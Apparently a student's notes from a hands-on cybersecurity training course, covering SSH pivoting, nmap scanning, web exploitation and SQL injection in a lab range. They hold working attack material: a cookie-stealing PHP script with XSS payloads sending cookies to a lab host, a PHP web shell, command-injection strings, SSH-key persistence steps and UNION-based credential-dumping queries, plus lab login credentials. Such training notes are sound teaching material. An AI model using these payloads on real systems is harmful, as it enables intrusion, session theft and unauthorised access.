# Security
## Information
4434478809


```
CTFD:
http://10.50.20.30:8000/
http://10.50.20.30:8000/challenges

SQL INJECTION SITE
10.50.29.140

Cybbh:
https://sec.cybbh.io/public/security/latest/index.html

Stack:
16

Username:
MASO-005-M

Password:
W5KhuRv7dByR2Lk

Jumpbox:
10.50.39.67

windows_opstation_em90
192.168.65.10
10.50.21.242

lunix_opstation_em90 (password = password)
192.168.65.20
10.50.37.42

ssh student@10.50.37.42 -X

STACK Website:
vta.cybbh.space
ipa
```

## Control Sockets (Demo)

```
## Set up control socket
ssh -MS /tmp/jump student@10.50.39.67


## Ping Sweep
for i in {97..137}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done


## Dynamic Port Forward
ssh -S /tmp/jump jump -O forward -D 9050


## NMAP to find IP ports
proxychains nmap 192.168.28.100


## Port Interrigation
proxychains nc 192.168.28.129
proxychains nc 192.168.28.129 2222
proxychains wget -r http://192.168.28.129


## Creating Port Forwarding to host Alt Ports
ssh -S /tmp/jump jump -O forward -L 4567:192.168.28.100:80 -L 1234:192.168.28.100:2222


## Cancel Port Forwards
ssh -S /tmp/jump jump -O cancel -L 4567:192.168.28.100:80
ssh -S /tmp/jump jump -O -D 9050
ssh -S /tmp/jump jump -O cancel -L 4567:192.168.28.100:80 -L 1234:192.168.28.100:2222



## Using FIREFOX to see website hosted on .100:80
http://127.0.0.1:4567


## Creating a MS socket to the next hop found on port 2222
ssh -MS /tmp/t1 student@127.0.0.1 -p 1234 
```

# Penetration Testing

https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/01-pentesting-overview.html



## Phase 1: Mission Definition

    Define mission goals and targets.

    Determine scope of mission.

    What networks are valid targets?

    What machines are valid targets?

    What attacks or exploits are authorized/appropriate?

    Define RoE.

## Phase 2: Recon

    Information gathering about the target through public sources.

    Websites, job postings, search engines, etc.

    Done without touching the target.

## Phase 3: Footprinting

    Accumulate data through scanning and/or interation with the target/target resources.

    Use a variety of scanning and fingerprinting to determine information about target networks and devices.

## Phase 4: Exploitation/Initial Access

    Gain intial foothold into target network

    There is a more in-depth discussion that is done in exploitation research lesson

## Phase 5: Post-exploitation

    Establish persistence

    escalate priveleges

    obfuscate

    cover your tracks

    exfiltrate target data

## Phase 6: Document Mission

    Document and report mission details.



# Scanning and Recon
https://sec.cybbh.io/public/security/latest/lessons/lesson-2-recon_sg.html
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/02-network-scanning-and-recon.html


#p# Ping Sweep (CMD)
Sends one icmp echo request packet to each host on the 192.168.1.0/24

    Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

    Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.


## Port Enumeration

Use nmap to scan a range and specific ports on a discovered machine:

    nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080

Use nc to scan a range and specific ports on a discovered machine:

    nc -z -v -w 1 8.8.8.8 440-443

 

## Port Interrogation


Use nc to interrogate a web server:

    nc -Cv 127.0.0.1 80

    Type: GET / HTTP/1.0 to get a HTTP Response header from the server.

Use nmap to perform service detection on port 22 of your opstation:

    nmap -sV 127.0.0.1 -p 22

Using nikto to perform a vulnerability scan on your opstation:

    nikto -h 127.0.0.1 -p 80

        Also shows other information like what HTTP methods are allowed and various CVE vulnerabilities.


## NMAP Scripts (CMD)

/usr/share/nmap/scripts

ls -l /usr/share/nmap/script | grep rdp

nmap --script-help "ftp-* and discovery"




USAGE AND EXAMPLES

nmap --script <filename>|<category>|<directory>|<expression>[,…​]

    Runs all scripts that match defined criteria.

nmap --script-help "<filename>|<category>|<directory>|<expression>[,…​]"

    Shows help content for specific scripts, categories, etc.

nmap --script-args <args>

    Allows options definied within the script to be ran in conjunction with the script.

nmap --script-args-file <filename>

    Allows options definied within the script to be pre listed in a file and then ran in conjunction with the script.

nmap --script-help <filename>|<category>|<directory>|<expression>|all[,…​]

    Shows help about scripts. For each script matching the given specification, Nmap prints the script name, its categories, and its description.

nmap --script-trace

    Similar to --packet-trace as it will output traffic data to include protocol, source, destination, and transmitted data.



dns-brute.nse

    Find valid DNS (A) records by trying a list of common sub-domains and finding those that successfully resolve.

nmap -p 80 --script dns-brute.nse <domain name>

hostmap-bfk.nse

    Find virtual hosts on an IP address that you are attempting to compromise (or assess).

nmap -p 80 --script hostmap-bfk.nse <domain name>

traceroute-geolocation.nse

    Perform a traceroute to your target IP address and have geolocation data plotted for each hop along the way.

nmap --traceroute --script traceroute-geolocation.nse -p 80 <domain name>

http-enum.nse

    Attempts will be made to find valid paths on the web server that match a list of known paths for common web applications.

nmap --script http-enum <IP Address>

  --script-args http-enum.basepath='<Web Server Dir/>' <IP Address>

    This entry shows an example of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.

smb-os-discovery.nse

    Determines the operating system, computer name, netbios name and domain of a system.

nmap -p 445 --script smb-os-discovery <IP Address / Subnet>

firewalk.nse

    Discovers firewall rules using an IP Protocol Time To Live (TTL) expiration technique

nmap -p 80 --script=firewalk.nse <IP Address>

  --script-args=firewalk.max-retries=1 <IP Address>
  --script-args=firewalk.probe-timeout=400ms <IP Address>
  --script-args=firewalk.firewalk.max-probed-ports=7 <IP Address>

This entry shows examples of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.




## Scraping Data (CMD)

scraping.py

PREP
pip install lxml requests



SCRIPT
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')  ## Tunnels
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```



OUTPUT
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']




# Vulnerability and EXploitation Research

https://sec.cybbh.io/public/security/latest/lessons/lesson-3-research_sg.html
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/03-exploitation-research-slides.html


# Web Exploitations Day 1

https://sec.cybbh.io/public/security/latest/lessons/lesson-4-xss_sg.html
https://git.cybbh.space/sec/public/-/jobs/872115/artifacts/external_file/slides/04-web-exploitation.html


## Server Client Relationship

Synchronous communication between user and services

## HTTP


Some common field names for request headers include:

    Host - the domain name of the server being requested. "example.com" — This is especially relevant in servers that host multiple domains, or "virtual hosts."

    User-Agent - an identifier for the web browser. "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"

    Referer - the URI that of the web page that referred the browser to the current request. "https://www.google.com/"

    Accept-Language - the language that the browser will reqeust. "en-US,en"

    Accept - the type of content the browser supports accepting. "text/html"

    Cookie - the cookie values associated with the request. These are usually set by the server in a response first and then returned in subsequent requests to allow the server to track state across multiple requests. "session=4ea45745732f14792ca80c3ef73b69c9"

    Content-Length - the number of octets transmitted in the request body. "19"

    Date - the server timestamp of the response

    Content-Type - indicates the media type of the message body. "text/html"

    Content-Length - the number of octets transmitted in the response message body. "50"

    Server - a string to identify the server software. "Apache/2.2.22 (Debian)"

    Set-Cookie - sets a cookie value for the browser to remember. "Set-Cookie: session=eyJwaWN0dXJlIjoiL3ZpZXcvc3BhY2VfUmFuZ2VyLmpwZyIsInJhbmsiOjAsInVzZXJuYW1lIjoiYXNkZiJ9.DoqU5A.XjY6M70e1Hb3SX8ZiH9tRJ7QfsI; HttpOnly; Path=/"



## CLI Web Tools



WGET provides:

    Recursive download

    Requires no extra options to download a file

    Supports OpenSSL for SSL/TLS support

    Recover from boken transfer

    cookies, redirect, time stamping features enabled by default

    Support for HTTP, HTTPS, and FTP

cURL provides:

    Pipe usage

    Single transfers

    Supports more protocols than WGET such as SCP, SFTP, POP3 to name a few

    HTTP authentication

    SOCKS support

    Upload and download ability

    Support gzip and deflate conetent-encoding with automatic decompression



## CMDS

curl -X POST http://website -d 'username=yourusername&password=yourpassword'
	

Use POST method to login to website

curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
	

Send Cookie settings with data, then pipe results

curl -o stuff.html http://website/stuff.html
	

Save to file

wget -r -l2 -P /tmp ftp://ftpserver/
	

recursive download two level deep of base dir and save to /tmp

wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
	

Save cookies for website into a file

wget --load-cookies cookies.txt -p http://example.com/interesting/article.php
	

Use the cookie file to grab the page we want

## JAVA Script (JS)

Allows websites to interact with the client

Proof of concept (simple alert):

<script>alert('XSS');</script>

    Capturing Cookies
    document.cookie

    Capturing Keystrokes

        bind keydown and keyup

    Capturing Sensitive Data
    document.body.innerHTML






## Website Enumeration (CMD)



ssh root@10.50.24.104 -D 9050

proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>

nikto v -h <IP>



## Cross-Site Scripting XXS


## Reflected XSS

According to owasp.org, "reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS."

An example of XSS vulnerability might be a website that stores some value encoded in a variable in the GET request, and then displays that value directly back to the user. For example, data can be hex or base64 encoded, and then decoded by the server and displayed back to the user.

In the following example, the "name" GET variable is a Base64 encoding (and then a URL encoding) of user123. An imaginary server at example.com decodes the variable and displays it straight back to the user without any sanitization or filtering.

http://example.com/page.php?name=dXNlcjEyMw%3D%3D

A malicious actor could Base64 encode a Javascript payload and then trick a user to click on the link. The server would then decode the Javascript and include it in the HTML source of the website, executing untrusted Javascript within the context of the trusted website. This could be used to phish a user, gather information about the user’s state on the trusted website, or otherwise redirect them to a malicious website.

Most actors will Base64 encode and than use TinyURL for futher obfuscation and to make the link seem more legitimate.


## Stored XSS

According to Owasp.org, "stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS."

Stored XSS can be more dangerous because it does not require a user to click on a malicious link, but instead to simply visit the trusted website. Stored XSS can be used to keylog, gather session information, or deploy malicious payloads to visiting users.

An example of a stored XSS might be one that creates an iframe or image and adds it in the background of the page. The iframe could load a URL such as "http://badguydomain.com/?" + document.cookie and exfiltrate all of the visitor’s cookie information.


## DEMO: Stored XXS

    Utilize the message board hosted on the Demo-Web_Exploit_upload: http://<float ip>/chat/messageb.php

    SSH into the demo-web-exploit-sql and cd into /var/www/html. This demo has a PHP script setup to grab cookies as they are redirected (Cookie_Stealer1.php) and writes into 'cookiefile.txt'. You may walk the students through the php if wanted.

<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>

    On the message board enter a name and then input the following javascript in the message field and submit.

     <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>

    Show the students in the URL how we are redirected to our Cookie_Stealer page.

    cat the cookiefile.txt file our demo-web-exploit-sql to show that we where able to grab cookie information.

    To remove the stored XXS from sytem:

mysql
use messages;
select * from comments;  # --- find the ID your script is in
delete from comments where id = <ID>


<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">


python3 -m http.server
<script>documnent.location="http://linops:8000/"+document.cookie;</script>



## Robots.txt

10.50.33.232/robots.txt
Allow: ...
Allow: ...
Allow: ...
Disallow: ...


## DEMO: Directory Traversal

    Demo-Web_Exploit_upload instance navigate to http://<float IP>/path/pathdemo.php

    Page is set to read files from /etc so you can lookup: passwd, profile, networks, etc

    Traverse to these two files ../../../../var/www/html/robots.txt and ../../../../usr/share/joe/lang/fr.po



## Malicious File Upload:

    Malicious file upload vulnerabilities exist when a user is allowed to upload files to a server in a way that allows an attacker to upload malicious content to the server. An example might be a vulnerability that allows unauthenticated users to host arbitrary malicious files that could leverage the website’s reputation for use in phishing campaigns. However, often it also could allow for direct compromise of the webserver itself, such as in the upload of server-side script files that can later be executed with GET requests.

    Let’s return to the image hosting server in the directory traversal example. Let’s imagine the server is running Apache2 with the PHP module and is configured to serve all files at and within the default server directory of /var/www/html. Additionally, the server is configured with the default settings to execute any file with at .php extension with the PHP interpreter.

        Instead of storing the files in /data/uploads, upload.php stores the files in /var/www/html/uploads. The programmer intended for upload.php to only upload image files, but did not properly validate that the files were images. Consequently, it is possible to upload a malicious PHP named image.png.php.

        Because of how Apache and PHP work together in this situation, the attacker can execute this malicious file by accessing http://server/uploads/image.png.php. Attackers can leverage this technique to upload a web shell that allows them to execute arbitrary commands on the server:


```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>

```

The ability to trick the server to executing arbitrary files based on their extension is especially common in servers like Apache, Nginx or IIS. However, it also is possible in other frameworks as well. If there isn’t sanitization on the file name, an attacker can upload files to arbitrary locations as well.

Imagine we were using the Python framework Flask, which often tracks accessible URIs as routes in a file called views.py. We might be able to overwrite the normal views.py with our own malicious version that adds a URI route for command injection.



## DEMO: Malicious File Upload

    Browse to the Demo-Web_Exploit_XSS instance by navigating to http://<float IP>

    Create malicious file with code above and upload.

    Navigate to /uploads and click your file or call it directly /uploads/<evil_file>

    Conduct enumeration to determine how we could develop a secure shell

    After enumeration, perform commands such as uploading your ssh key



## Command Injection

Command injection occurs when some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands.

A very basic command injection that is common in home router diagnostic tools is the ping utility. In this case, a web interface allows users to ping an IP address to see if it is online. A vulnerable server might do something as simple as execute system("ping -c 1 ".$_GET["ip"]); on the server-side of the website.; An attacker could leverage this to inject ; cat /etc/passwd, which would make the overall command that is executed ping -c 1 ; cat /etc/passwd.

While the basic ping command injection example seems obvious, command injection can occur in places that may not seem inherently obvious. Let’s go back to the image hosting example we’ve been using. Let’s say the developer wants to check to see if the file being uploaded is actually an image file. First it checks if the final extension is either .png, .jpg, or .gif. Then it copies the file to /tmp/imgcheck/filename and runs file /tmp/imgcheck/filename to make sure the file utility recognizes the file headers as one of the accepted image types. A malicious user could set the filename of the upload to be ; cat /etc/passwd;#.png. When the script tries to open the path for writing, it will fail because "/tmp/imgcheck/; cat /etc/passwd;#.png" is not a valid path. However, when it tries to run the file command, it will execute file /tmp/imgcheck/; cat /etc/passwd;#.png.
	Trying to read /etc/passwd is a common check for command execution or directory traversal because the file is globally readable. However, another technique is to run a ping to an IP address that the attacker controls and then watch a packet capture on that remote device and watch for a successful ping. 

 

## Demo: Command Injection

    Demo-Web_Exploit_upload instance navigate to http://<float IP>/cmdinjection/cmdinjectdemo.php

    Ping a IP to show the page works as designed

    Showcase a few ways to successfully invoke command injection and perform system enumeration

     ; whoami
     ; cat /etc/passwd
     ; ls -latr & netstat -rn
     || ifconfig

    After enumeration, perform commands such as uploading your ssh key to gain access




## SSH Key Upload

Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.
SSH Key Setup

    Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well

     ssh-keygen -t rsa

    After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension

     cat ~/.ssh/id_rsa.pub

	The entire output is your public key, make sure when uploading you copy everything
Uploading SSH Key

On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
	The following process is done on target through command injection or malicious upload.

    



## SSH Key Upload Demo
    
    
1    Find out what account is running the web sever/commands.

     whoami

2    Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

     www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

3    Check to see if .ssh folder is in the users home directory. If not make it

     ls -la /users/home/directory      #check if .ssh exists
     mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist

4    Echo ssh key to the authorized_keys file in the users .ssh folder.

     echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys

5    Verify key has been uploaded successfully.

     cat /users/home/directory/.ssh/authorized_keys

Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.



ssh-keygen -t rsa -b 4096



# SECURITY DAY 2 (CMD)



## ENUMERATION
proxychains nmap 10.100.28.40

Nmap scan report for 10.100.28.40
Host is up (0.00078s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

proxychains nc 10.100.28.40 4444

SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.100.28.40

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse

PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/net_test



New IP
10.100.28.55

User:
billybob

www-data:x:33:33:www-data:/var/www:/bin/bash
billybob:x:1001:1001:you found me 1mpriUx44xTsvU8HtOYr:/home/billybob:/bin/bash

Directory Traversal
Navigate to 10.100.28.55 website
scroll down and click "here" link
clip drop down provieded and select random document
not URL feild for the "=" symbol this will allow you to traverse different directorys via ../../../../../etc/passwd


From LinOps
cd /home
python3 -m http.server

From Website 
<script>document.location="http://10.50.38.176:8000/"+document.cookie;</script>
To get Cookies


## SSH KEYUPLOAD 

ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub

ls -la /users/home/directory      #check if .ssh exists
mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist

echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys

SSH INTO MACHINE



## MALICIOUS FILE UPLOAD

UPLOAD


Server doesn’t validate extension or size

Allows for code execution (shell)

Once uploaded

Find your file

Call your file

```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```


## SERVER SIDE INJECTION (CMD)

view_image.php?file=../../etc/passwd




# Web Exploitation Day 2
https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/05-sql-injection-slides.html


## What is SQL Commands
S tructured Q uery L anguage - ANSI Standard

Commands, such as below, are standardized across vendors, and can accomplish almost all tasks inside a Database:
SELECT
UPDATE
DELETE
CREATE
DROP

SELECT UNION
UNION SELECT

Basic SQL Commands:
Command
	
```
Usage

USE               Select the database to use**
SELECT            Extract data from a database
UPDATE            Update data in a database
DELETE            Delete data from a database
INSERT INTO       Insert new data into a database
CREATE DATABASE   Create a new database
ALTER DATABASE    Modify an existing database
CREATE TABLE      Create a new table
ALTER TABLE       Modify an existing table
DROP TABLE        Delete a table
CREATE INDEX      Create an index (search key)
DROP INDEX        Delete an index
UNION             Combine the result-set of two or more equal SELECT statements**
```
https://www.w3schools.com/SQL/sql_syntax.asp



## SQL Commands DEMO

```
SHOW databases;
SHOW TABLES FROM session;
SELECT * FROM session.car;
USE session;
SHOW Tables;
DESCRIBE car;
SELECT * FROM car;
SELECT * FROM car UNION SELECT tireid,name,size,cost,1,2 FROM Tires;

```

## SQL Command DEMO SSgt DOW GOLDEN STATEMENT
 
```
get into a SQL server
mysql

query the databases on the SQL server
show database; (top three will be the default)

how to use the databases from the show command
use information_schema; (will drop you into the directory)

will show tables and information about the database
show columns from columns;
TABLE_CATALOG
TABLE_SCHEMA
TABLE_NAME
COLUMN_NAME

within information_schema database and columns tables show me table_names for all databases
select table_name from information_schema.columns;

you can add to your select to pull more information
select table_name,column_name from information_schema.columns;

added table_schema to the command
select table_schema,table_name,column_name from information_schema.columns;





show databases;

show tables from session;

show columns from session.Tires;

select tireid,name,size from session.Tires

select tireid,name,size from session.Tires UNION SELECT




show columns from session.car

select tireid,name,size from session.Tires UNION SELECT name,type,cost from session.car
^ Will dump the information from the select fields from both session.Tire and session.car

select tireid,name,size,4 from session.Tires UNION SELECT name,type,cost,color from session.car
^ The 4 allows you to call an uneven amount of arguments and it not error out

```



## SQL Bot Practice




```
Find the movie with a row id of 6 ✓

select title from movies where id=6


Find the movies released in the years between 2000 and 2010

select title from movies where year between 2000 and 2010;


Find the movies not released in the years between 2000 and 2010

select title from movies where year not between 2000 and 2010;


Find the first 5 Pixar movies and their release year

SELECT title, year FROM movies
WHERE year <= 2003;





Find all the Toy Story movies ✓
SELECT title, director FROM movies 
WHERE title LIKE "Toy Story%";

Find all the movies directed by John Lasseter
SELECT title FROM movies 
WHERE director = "John Lasseter";

Find all the movies (and director) not directed by John Lasseter
SELECT title,director FROM movies 
WHERE director != "John Lasseter";

Find all the WALL-* movies
SELECT title FROM movies 
WHERE title LIKE "WALL%";






List all directors of Pixar movies (alphabetically), without duplicates ✓
SELECT DISTINCT director FROM movies
ORDER BY director ASC;

List the last four Pixar movies released (ordered from most recent to least)
SELECT title, year FROM movies
ORDER BY year DESC
LIMIT 4;

List the first five Pixar movies sorted alphabetically
SELECT title from movies
order by title asc
limit 5;

List the next five Pixar movies sorted alphabetically
SELECT title from movies
order by title asc
limit 5 offset 5;






List all the Canadian cities and their populations ✓
SELECT city,population FROM north_american_cities
where country = "Canada";

Order all the cities in the United States by their latitude from north to south
select city from north_american_cities
where country = "United States"
order by latitude desc;

List all the cities west of Chicago, ordered from west to east
SELECT city, longitude FROM north_american_cities
WHERE longitude < -87.629798
ORDER BY longitude ASC;

List the two largest cities in Mexico (by population)
select city from north_american_cities
where country = "Mexico"
order by population desc
limit 2;

List the third and fourth largest cities (by population) in the United States and their population
select city from north_american_cities
where country = "United States"
order by population desc
limit 2 offset 2;





Find the domestic and international sales for each movie ✓
SELECT title, domestic_sales, international_sales 
FROM movies
  JOIN boxoffice
    ON movies.id = boxoffice.movie_id;

Show the sales numbers for each movie that did better internationally rather than domestically
SELECT title, domestic_sales, international_sales
FROM movies
  JOIN boxoffice
    ON movies.id = boxoffice.movie_id
WHERE international_sales > domestic_sales;

List all the movies by their ratings in descending order

```

## SQL Injection Considerations (CMD)

BEFORE INPUT:

SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;


AFTER INPUT:

SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;



User enters tom' OR 1='1 in the name and pass fields.


Truth Statement: tom ' OR 1='1


Server-Side query executed would appear like this:


SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’




## Authentication BYPASS using LOGIN (DEMO)


Identify we have USER LOGIN Page
NOT SURE WHICH FIELD CAN BE EXPLOITED
PASS TRUTH STATEMENT INTO FIELDS
POST METHOD IS TRYING THE LOGIN FIELDS
GET METHOD IS SENDING TO URL
LOGIN-> INSPECT -> COPY FROM POST REQUEST RAW TAB-> COPY INTO URL
http://x.x.x.x/login.php/?{PASTE}
Access to CREDENTIALS


username: ' OR 1='1
password: ' OR 1='1

GET OR 1=1

inspect -> network tab -> send login again

inspect -> network -> Request - raw radial button

Copy Request information from POST REQUEST 

paste in URL http://x.x.x.x/login.php/?{PASTE}

Gets us credentials:


```
Array
(
    [0] => Luke_Skywalker
    [name] => Luke_Skywalker
    [1] => Jedi
    [pass] => Jedi
)
1Array
(
    [0] => Darth_Vader
    [name] => Darth_Vader
    [1] => Sith
    [pass] => Sith
)
1Array
(
    [0] => c3p0
    [name] => c3p0
    [1] => annoying
    [pass] => annoying
)
1Array
(
    [0] => Batman
    [name] => Batman
    [1] => BWyane
    [pass] => BWyane
)
1
```


## GOLDEN STATEMENT (CMD)
```
select table_schema,table_name,column_name from information_schema.columns;
```

## UNION.HTML POST METHOD (DEMO)

1. Identify Vulnerable Field
Interact normally to see how it works
Pass truth statements to each to see if vulnerable
Ford\' OR 1='1\
Dodge\' OR 1='1\
Honda\' OR 1='1\
Audi' OR 1='1          * VULNERABLE FIELD


2. Identify number of columns
Audi' UNION SELECT 1,2,3,4,5 # 
We see 1 3 4 5
So we use our GOLDEN STATEMENT AND modify it so we do not error out

Audi'  UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #

Sessions
	Tires
 		tireid
   		name
		size
		cost
  	car	
   		cost
     		name
       		type

  	userinfo
		studentID
  		username
		passwd


 Audi' UNION SELECT username,2,passwd,jump,5 from session.userinfo #
This command would query inside userinfo to pull username, passwd, jump information from session.userinfo


Audi' UNION SELECT tireid,2,name,size,5 from session.Tires #
pulls information from session.Tires on tireid,name,and size



## UNION.HTML GET METHOD (DEMO) BLIND INJECTION


Use the submnit bar to go to the query
Use the URL BAR 

http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit

Delete back to the 1
http://10.50.29.140/uniondemo.php?Selection=1

Add truth statement to each of the SELECTIONS to see which is vulenrable 

http://10.50.29.140/uniondemo.php?Selection=1 or 1=1

http://10.50.29.140/uniondemo.php?Selection=2 or 1=1	VULNERABLE

http://10.50.29.140/uniondemo.php?Selection=3 or 1=1	VULNERABLE

http://10.50.29.140/uniondemo.php?Selection=4 or 1=1	VULNERABLE


NOW see the amount of columns
http://10.50.29.140/uniondemo.php?Selection=2 UNION SELECT 1,2,3
Shows table like 132
change position in golden statment
UNION SELECT table_schema,table_name,column_name from information_schema.columns;
UNION SELECT table_schema,column_name,table_name from information_schema.columns;

NOW PASTE YOUR UNION SELECT INTO THE URL
UNION SELECT table_schema,column_name,table_name from information_schema.columns;

http://10.50.29.140/uniondemo.php?Selection=2%20UNION%20SELECT%20table_schema,column_name,table_name%20from%20information_schema.columns;

NOW WE CAN SEND QUERIES INTO URL

UNION SELECT sesion_id,user_id,status from session.session_log

UNION SELECT id,name,pass from session.session_user

## @@version

shows database version

Passing injection through the URL:

After the .php?item=4 pass your UNION statement


prices.php?item=4 UNION SELECT 1,2


prices.php?item=4 UNION SELECT 1,2,@@version


What is @@version?


Abuse The Client (Enum)

Identifying the schema leads to detailed queries to enumerate the DB


Research Database Schemas and what information they provide


php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


What are information_schema and database()?



UNION SELECT id,date,member from sqlinjection.orders where id = "1337"

UNION SELECT id,comment,mime from sqlinjection.shares4 where id = "1337"

UNION SELECT id,name,description from sqlinjection.products where id = "1337"

UNION SELECT id,name,description from sqlinjection.categories where id = "1337"

UNION SELECT id,username,password from sqlinjection.members where id = "1337"

UNION SELECT id,quantity,product from sqlinjection.orderlines where id = "1337"



# Reverse Engineering
https://sec.cybbh.io/public/security/latest/lessons/lesson-6-reverse_sg.html
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/06-reverse-engineering.html


## x86_64 Assembly Registers 

General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
There are 16 general purpose 64 bit registers. These registers can be broken down into smaller sections. Take %rbx for example. To call its entire 64 bits, you would use %rbx. However, to call its lower 32 bits, you would call %ebx. It can then be broken down further into the lower 16 and 8 bits as bx and bl, respectively.
x86 was originally a 32 bit architecture. It originally had eight 32 bit general purpose registers: EAX, ECX, EDX, EBX, ESP, EBP, ESI, and EDI.

## x86_64 Arguments

[%ebp-0x8]

## x86_64 Common Terms

Heap
Memory that can be allocated and deallocated

Stack
A contiguous section of memory used for passing arguments

General Register
A multipurpose register that can be used by either programmer or user to store data or a memory location address

Control Register
A processor register that changes or controls the behavior of a CPU
Control Register - A processor register that changes or controls the behavior of a CPU. Control Registers do common tasks like interrupt control, switching the addressing mode, paging control, and co-processor control.
* There are 16 64-bit control registers: %CR0-%CR15. Only %CR0 can be written to or read from. These are generally used in things like Kernel development.

Flags Register
Contains the current state of the processor
Flags Register - Contains the current state of the processor. FLAGS is 16 bits wide, EFLAGS is 32 bits and RFLAGS is 64 bits wide. The wider flag registers are compatible with the smaller registers.
* There is one 64-bit flags register: %RFLAGS.
Flags are set via specific bits in the register. The most important to take note of below are the Carry Flag, Zero Flag, and Sign Flag as these are used by common instructions like JE.
Its bits are labeled as:




## x86 Intel Instructions




MOV: move source to destination
mov r15,#n  <- r15 = #n
mov rax,m   <- move contents of 64bit address to %rax
mov m,rax   <- move contents of %rax to 64 bit memory address


PUSH: push source onto stack
push r15    <-push r15 onto stack


POP: Pop top of stack to destination
pop r8      <-move value on top of stack to r8


INC: Increment source by 1
inc r8      <-increment value in r8 by 1


DEC: Decrement source by 1
dec r8      <-decrement value in r8 by 1


ADD: Add source to destination
add r13,#n  <-add #n to %r13, store result in %r13


SUB: Subtract source from destination
sub r13,#n  <-subtract #n from %r13, store result in %r13


CMP: Compare 2 values by subtracting them and setting the %RFLAGS register. 
